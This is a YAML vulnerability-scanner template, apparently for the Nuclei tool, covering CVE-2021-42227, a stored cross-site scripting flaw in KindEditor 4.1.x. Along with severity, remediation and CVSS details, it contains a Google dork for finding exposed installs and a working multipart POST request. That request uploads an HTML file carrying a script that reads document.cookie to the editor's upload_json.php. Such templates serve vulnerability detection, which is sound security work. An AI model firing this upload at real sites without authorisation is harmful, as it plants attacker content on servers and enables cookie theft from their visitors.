id: CVE-2021-42227

info:
  name: KindEditor 4.1.x Stored XSS Vulnerability
  author: ProjectDiscoveryAI
  severity: medium
  description: Cross Site Scripting (XSS) vulnerability exists in KindEditor 4.1.x via a Google search inurl:/examples/uploadbutton.html and then the .html file on the website that uses this editor (the file suffix is allowed).
  impact: |
    Successful exploitation could allow an attacker to execute malicious scripts in the context of the victim's browser, leading to potential data theft or account compromise.
  remediation: |
    Upgrade to a patched version of KindEditor 4.1.x or apply vendor-supplied patches to mitigate the vulnerability.
  reference:
    - https://github.com/kindsoft/kindeditor/issues/336
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
    cvss-score: 6.1
    cve-id: CVE-2021-42227
    cwe-id: CWE-79
    epss-score: 0.00087
    epss-percentile: 0.38623
    cpe: cpe:2.3:a:kindsoft:kindeditor:*:*:*:*:*:*:*:*
  metadata:
    vendor: kindsoft
    product: kindeditor
  tags: intrusive

http:
  - method: POST
    path:
      - "{{BaseURL}}/Public/JS/kindeditor-4.1.10/php/upload_json.php?dir=file"

    headers:
      Content-Type: multipart/form-data; boundary=---------------------------293582696

    body: |
      -----------------------------293582696
      Content-Disposition: form-data; name="imgFile"; filename="iframe.html"
      Content-Type: text/html

      <script>alert(document.cookie)</script>
      -----------------------------293582696
    matchers:
      - type: word
        words:
          - "iframe.html"
        part: body
